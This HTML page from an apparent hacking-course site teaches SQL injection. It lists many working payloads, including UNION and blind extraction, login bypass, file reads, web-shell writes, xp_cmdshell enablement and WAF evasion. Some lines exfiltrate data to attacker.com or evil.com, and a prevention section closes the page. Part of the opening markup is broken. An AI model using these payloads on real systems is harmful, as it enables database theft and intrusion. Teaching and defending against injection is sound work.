<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL Injection Attacks - ABID HACKER</title>
    
    <!-- Bootstrap CSS CDN -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    
    <!-- Font Awesome CDN -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- Custom CSS -->
    <link rel="stylesheet" href="../../css/style.css">
</head>
<body>
    <!-- Navigation Bar -->
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top">
        <div class="container">
            <a class="navbar-brand" href="../../index.html">
                <i class="fas fa-shield-alt"></i> ABID HACKER
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ms-auto">
                    <li class="nav-item">
                        <a class="nav-link" href="../../index.html">Home</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="../courses.html">Courses</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="../about.html">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="../contact.html">Contact</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <!-- Main Content -->
    <main class="container my-5" style="margin-top: 100px !important;">
        <div class="row">
            <!-- Sidebar Navigation -->
            <div class="col-lg-3">
                <div class="card border-success sticky-top" style="top: 100px;">
                    <div class="card-header bg-success text-white">
                        <h6 class="mb-0">SQL Injection</h6>
                    </div>
                    <div class="card-body p-0">
                        <ul class="list-group list-group-flush">
                            <li class="list-group-item bg-dark border-success">
                                <a href="#introduction" class="text-success text-decoration-none">Introduction</a>
                            </li>
                            <li class="list-group-item bg-dark border-success">
                                <a href="#types" class="text-success text-decoration-none">SQL Injection Types</a>
                            </li>
                            <li class="list-group-item bg-dark border-success">
                                <a href="#detection" class="text-success text-decoration-none">Detection Methods</a>
                            </li>
                            <li class="list-group-item bg-dark border-success">
                                <a href="#exploitation" class="text-success text-decoration-none">Exploitation</a>
                            </li>
                            <li class="list-group-item bg-dark border-success">
                                <a href="#advanced" class="text-success text-decoration-none">Advanced Techniques</a>
                            </li>
                            <li class="list-group-item bg-dark border-success">
                                <a href="#prevention" class="text-success text-decoration-none">Prevention</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>

            <!-- Main Content Area -->
            <div class="col-lg-9">
                <div class="card border-success">
                    <div class="card-header bg-success text-white">
                        <h1 class="mb-0"><i class="fas fa-database"></i> SQL Injection Attacks</h1>
                    </div>
                    <div class="card-body">
                        <!-- Introduction Section -->
                        <section id="introduction">
                            <h2 class="text-success">Introduction to SQL Injection</h2>
                            <p>SQL Injection is one of the most common and dangerous web application vulnerabilities. It occurs when an attacker can insert malicious SQL code into application queries.</p>
                            
                            <div class="alert alert-info mt-4">
                                <h4 class="text-primary"><i class="fas fa-lightbulb"></i> Core Theory</h4>
                                <p>SQL Injection exploits the fundamental flaw of mixing code and data. Think of it like a conversation where someone tricks you into following their instructions by disguising commands as normal speech. The database can't distinguish between legitimate queries and malicious commands.</p>
                            </div>

                            <h3 class="text-success mt-4">How SQL Injection Works</h3>
                            <p>SQL Injection occurs due to improper input validation and query construction:</p>
                            
                            <div class="card bg-dark text-white mt-3">
                                <div class="card-header">
                                    <h5><i class="fas fa-code"></i> Vulnerable Code Example</h5>
                                </div>
                                <div class="card-body">
                                    <pre><code>// Vulnerable PHP code
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($connection, $query);</code></pre>
                                    <p class="mt-2 text-warning">This code directly concatenates user input into SQL query, making it vulnerable.</p>
                                </div>
password: secret123
Query: SELECT * FROM users WHERE username = 'admin' AND password = 'secret123'

# Malicious Input
username: admin'--
password: anything
Query: SELECT * FROM users WHERE username = 'admin'-- ' AND password = 'anything'
                            </div>

                            <h3 class="text-success mt-4">Impact of SQL Injection</h3>
                            <div class="row">
                                <div class="col-md-6">
                                    <ul>
                                        <li><strong>Data Breach:</strong> Access sensitive information</li>
                                        <li><strong>Authentication Bypass:</strong> Login without credentials</li>
                                        <li><strong>Data Manipulation:</strong> Modify database records</li>
                                        <li><strong>Data Deletion:</strong> Delete critical data</li>
                                    </ul>
                                </div>
                                <div class="col-md-6">
                                    <ul>
                                        <li><strong>Privilege Escalation:</strong> Gain admin access</li>
                                        <li><strong>File System Access:</strong> Read/write server files</li>
                                        <li><strong>Command Execution:</strong> Run OS commands</li>
                                        <li><strong>DoS Attacks:</strong> Crash database server</li>
                                    </ul>
                                </div>
                            </div>
                        </section>

                        <!-- Types Section -->
                        <section id="types" class="mb-5">
                            <h2 class="text-success">Types of SQL Injection</h2>
                            
                            <h3 class="text-success mt-4">1. In-Band SQL Injection</h3>
                            <div class="card bg-dark border-success mb-3">
                                <div class="card-body">
                                    <h5 class="text-success">Error-Based SQL Injection</h5>
                                    <p class="text-light">Uses database error messages to extract information.</p>
                                    <div class="terminal">
# Test payload
' OR 1=1--

# MySQL error extraction
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

# MSSQL error extraction
' AND 1=CONVERT(int, (SELECT @@version))--

# Oracle error extraction
' AND 1=CAST((SELECT banner FROM v$version WHERE rownum=1) AS int)--
                                    </div>
                                </div>
                            </div>

                            <div class="card bg-dark border-success mb-3">
                                <div class="card-body">
                                    <h5 class="text-success">Union-Based SQL Injection</h5>
                                    <p class="text-light">Uses UNION operator to combine results from multiple queries.</p>
                                    <div class="terminal">
# Find number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  (until error)

# UNION attack
' UNION SELECT 1,2,3--
' UNION SELECT null,username,password FROM users--

# MySQL version extraction
' UNION SELECT 1,version(),database()--

# Table enumeration
' UNION SELECT 1,table_name,null FROM information_schema.tables--
                                    </div>
                                </div>
                            </div>

                            <h3 class="text-success mt-4">2. Inferential SQL Injection (Blind)</h3>
                            <div class="card bg-dark border-success mb-3">
                                <div class="card-body">
                                    <h5 class="text-success">Boolean-Based Blind</h5>
                                    <p class="text-light">Uses boolean logic to infer information based on application responses.</p>
                                    <div class="terminal">
# Test for vulnerability
' AND 1=1--  (should return normal response)
' AND 1=2--  (should return different response)

# Extract database name length
' AND LENGTH(database())=1--
' AND LENGTH(database())=2--
' AND LENGTH(database())=8--  (true response)

# Extract database name character by character
' AND SUBSTRING(database(),1,1)='a'--
' AND SUBSTRING(database(),1,1)='t'--  (true response)
' AND SUBSTRING(database(),2,1)='e'--
                                    </div>
                                </div>
                            </div>

                            <div class="card bg-dark border-success mb-3">
                                <div class="card-body">
                                    <h5 class="text-success">Time-Based Blind</h5>
                                    <p class="text-light">Uses database time delays to infer information.</p>
                                    <div class="terminal">
# MySQL time delay
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--

# MSSQL time delay
'; WAITFOR DELAY '00:00:05'--
' AND IF(1=1) WAITFOR DELAY '00:00:05'--

# PostgreSQL time delay
'; SELECT pg_sleep(5)--

# Oracle time delay
' AND CASE WHEN 1=1 THEN dbms_lock.sleep(5) ELSE 0 END--
                                    </div>
                                </div>
                            </div>

                            <h3 class="text-success mt-4">3. Out-of-Band SQL Injection</h3>
                            <div class="card bg-dark border-success">
                                <div class="card-body">
                                    <p class="text-light">Uses different communication channels to extract data (DNS, HTTP).</p>
                                    <div class="terminal">
# DNS exfiltration (MySQL)
' AND LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\test'))--

# HTTP exfiltration (MSSQL)
'; EXEC master..xp_dirtree '\\\\attacker.com\\'+@@version+'\\test'--

# Email exfiltration
'; EXEC msdb.dbo.sp_send_dbmail @recipients='attacker@evil.com', @subject='Data', @body=(SELECT @@version)--
                                    </div>
                                </div>
                            </div>
                        </section>

                        <!-- Detection Section -->
                        <section id="detection" class="mb-5">
                            <h2 class="text-success">SQL Injection Detection</h2>
                            
                            <h3 class="text-success mt-4">Manual Testing</h3>
                            <div class="terminal">
# Basic payloads
'
"
`
')
")
`)
' OR '1'='1
' OR 1=1--
" OR 1=1--
' OR 'a'='a
" OR "a"="a
') OR ('1'='1
") OR ("1"="1

# Error-inducing payloads
'
"
\
'%20OR%201=1--
'%20OR%20'1'='1
%27%20OR%201=1--

# Time-based detection
'; WAITFOR DELAY '00:00:05'--
' AND SLEEP(5)--
'; SELECT pg_sleep(5)--
                            </div>

                            <h3 class="text-success mt-4">Automated Tools</h3>
                            <div class="terminal">
# SQLMap (most popular)
sqlmap -u "http://target.com/page.php?id=1"
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test"
sqlmap -r request.txt

# Other tools
# NoSQLMap (for NoSQL databases)
python nosqlmap.py -t http://target.com -p parameter

# jSQL Injection (GUI tool)
java -jar jsql-injection-v0.82.jar

# Havij (Windows GUI)
# SQLNinja (MSSQL focused)
# SQLiX (Perl-based)
                            </div>

                            <h3 class="text-success mt-4">Testing Different Contexts</h3>
                            <div class="terminal">
# GET parameters
http://target.com/page.php?id=1'

# POST data
username=admin'&password=test

# HTTP headers
User-Agent: Mozilla/5.0' OR 1=1--
Cookie: sessionid=abc123'; DROP TABLE users--
X-Forwarded-For: 127.0.0.1' OR 1=1--

# JSON parameters
{"username":"admin'","password":"test"}

# XML parameters
<user>admin'</user>
                            </div>
                        </section>

                        <!-- Exploitation Section -->
                        <section id="exploitation" class="mb-5">
                            <h2 class="text-success">SQL Injection Exploitation</h2>
                            
                            <h3 class="text-success mt-4">Data Extraction</h3>
                            <div class="terminal">
# Extract database version
' UNION SELECT @@version,null,null--  (MySQL/MSSQL)
' UNION SELECT version(),null,null--  (PostgreSQL)
' UNION SELECT banner,null,null FROM v$version--  (Oracle)

# Extract current database
' UNION SELECT database(),null,null--  (MySQL)
' UNION SELECT db_name(),null,null--  (MSSQL)
' UNION SELECT current_database(),null,null--  (PostgreSQL)

# Extract tables
' UNION SELECT table_name,null,null FROM information_schema.tables--

# Extract columns
' UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_name='users'--

# Extract data
' UNION SELECT username,password,email FROM users--
                            </div>

                            <h3 class="text-success mt-4">Authentication Bypass</h3>
                            <div class="terminal">
# Basic bypass
username: admin'--
password: anything

username: admin'/*
password: anything

username: ' OR 1=1--
password: anything

# Advanced bypass
username: admin' AND '1'='1'--
username: admin' OR 'x'='x'--
username: ') OR ('1'='1'--
username: admin'||'1'='1'--

# NoSQL injection (MongoDB)
username[$ne]: null
password[$ne]: null

username: {"$gt":""}
password: {"$gt":""}
                            </div>

                            <h3 class="text-success mt-4">File System Operations</h3>
                            <div class="terminal">
# Read files (MySQL)
' UNION SELECT LOAD_FILE('/etc/passwd'),null,null--
' UNION SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts'),null,null--

# Write files (MySQL)
' UNION SELECT 'shell code',null,null INTO OUTFILE '/var/www/html/shell.php'--

# Read files (MSSQL)
' UNION SELECT null,null,BulkColumn FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts',SINGLE_BLOB) AS x--

# Write files (PostgreSQL)
'; COPY (SELECT 'shell code') TO '/tmp/shell.php'--
                            </div>
                        </section>

                        <!-- Advanced Section -->
                        <section id="advanced" class="mb-5">
                            <h2 class="text-success">Advanced SQL Injection Techniques</h2>
                            
                            <h3 class="text-success mt-4">Second-Order SQL Injection</h3>
                            <div class="terminal">
# Registration phase (store malicious data)
username: admin'--
email: test@example.com

# Later, when data is used in another query
UPDATE users SET last_login = NOW() WHERE username = 'admin'--'

# The stored payload executes in the second query
                            </div>

                            <h3 class="text-success mt-4">WAF Bypass Techniques</h3>
                            <div class="terminal">
# Case variation
' UnIoN SeLeCt 1,2,3--

# Comment insertion
' UNION/**/SELECT/**/1,2,3--
' UNION%0ASELECT%0A1,2,3--

# Encoding
' %55NION %53ELECT 1,2,3--  (URL encoding)
' UNION SELECT 0x31,0x32,0x33--  (Hex encoding)

# Alternative operators
' || (SELECT password FROM users LIMIT 1)--  (Concatenation)
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>65--

# Function alternatives
SUBSTRING() vs MID() vs SUBSTR()
ASCII() vs ORD()
CONCAT() vs ||
                            </div>

                            <h3 class="text-success mt-4">Database-Specific Techniques</h3>
                            <div class="terminal">
# MySQL specific
' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--

# MSSQL specific
'; EXEC xp_cmdshell 'whoami'--
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--

# PostgreSQL specific
'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'c' STRICT--
'; SELECT system('id')--

# Oracle specific
' UNION SELECT null,banner,null FROM v$version WHERE rownum=1--
' UNION SELECT null,UTL_INADDR.get_host_name('127.0.0.1'),null FROM dual--
                            </div>
                        </section>

                        <!-- Prevention Section -->
                        <section id="prevention" class="mb-5">
                            <h2 class="text-success">SQL Injection Prevention</h2>
                            
                            <h3 class="text-success mt-4">Parameterized Queries</h3>
                            <div class="terminal">
# PHP (PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);

# PHP (MySQLi)
$stmt = $mysqli->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();

# Java (JDBC)
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement stmt = connection.prepareStatement(sql);
stmt.setString(1, username);
stmt.setString(2, password);

# C# (.NET)
string sql = "SELECT * FROM users WHERE username = @username AND password = @password";
SqlCommand cmd = new SqlCommand(sql, connection);
cmd.Parameters.AddWithValue("@username", username);
cmd.Parameters.AddWithValue("@password", password);

# Python (psycopg2)
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
                            </div>

                            <h3 class="text-success mt-4">Input Validation</h3>
                            <div class="terminal">
# Whitelist validation (PHP)
function validate_id($id) {
    if (!is_numeric($id) || $id < 1) {
        throw new Exception("Invalid ID");
    }
    return (int)$id;
}

# Length validation
function validate_username($username) {
    if (strlen($username) > 50 || !preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
        throw new Exception("Invalid username");
    }
    return $username;
}

# Type validation (Python)
def validate_user_id(user_id):
    try:
        return int(user_id)
    except ValueError:
        raise ValueError("Invalid user ID")

# Regular expression validation (JavaScript)
function validateEmail(email) {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(email);
}
                            </div>

                            <h3 class="text-success mt-4">Database Security</h3>
                            <div class="terminal">
# Principle of least privilege
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE ON myapp.* TO 'webapp'@'localhost';
REVOKE ALL PRIVILEGES ON mysql.* FROM 'webapp'@'localhost';

# Disable dangerous functions (MySQL)
SET GLOBAL local_infile = 0;
REVOKE FILE ON *.* FROM 'webapp'@'localhost';

# MSSQL security
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

# PostgreSQL security
REVOKE ALL ON pg_proc FROM PUBLIC;
REVOKE ALL ON pg_user FROM PUBLIC;

# Connection security
- Use SSL/TLS for database connections
- Implement connection pooling
- Set connection timeouts
- Use database firewalls
                            </div>

                            <h3 class="text-success mt-4">Web Application Firewalls</h3>
                            <div class="terminal">
# ModSecurity rules
SecRule ARGS "@detectSQLi" \
    "id:1001,\
    phase:2,\
    block,\
    msg:'SQL Injection Attack Detected',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}'"

# CloudFlare WAF
- Enable SQL injection protection
- Configure custom rules
- Monitor security events

# AWS WAF
{
  "Name": "SQLiRule",
  "MetricName": "SQLiRule",
  "Statement": {
    "SqliMatchStatement": {
      "FieldToMatch": {
        "AllQueryArguments": {}
      },
      "TextTransformations": [
        {
          "Priority": 0,
          "Type": "URL_DECODE"
        }
      ]
    }
  },
  "Action": {
    "Block": {}
  }
}
                            </div>
                        </section>

                        <!-- Navigation -->
                        <div class="d-flex justify-content-between mt-5">
                            <a href="xss-attacks.html" class="btn btn-outline-success">
                                <i class="fas fa-arrow-left"></i> Previous: XSS Attacks
                            </a>
                            <a href="csrf-attacks.html" class="btn btn-success">
                                Next: CSRF Attacks <i class="fas fa-arrow-right"></i>
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="bg-dark text-white py-4 mt-5">
        <div class="container">
            <div class="text-center">
                <p>&copy; 2024 ABID HACKER. Created by Abid Mehmood - Professional Web Designer</p>
                <p>Email: abidbusiness@gmail.com | Phone: 03029382306</p>
            </div>
        </div>
    </footer>

    <!-- Bootstrap JS CDN -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    
    <!-- jQuery CDN -->
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    
    <!-- Custom JS -->
    <script src="../../js/script.js"></script>
</body>
</html>
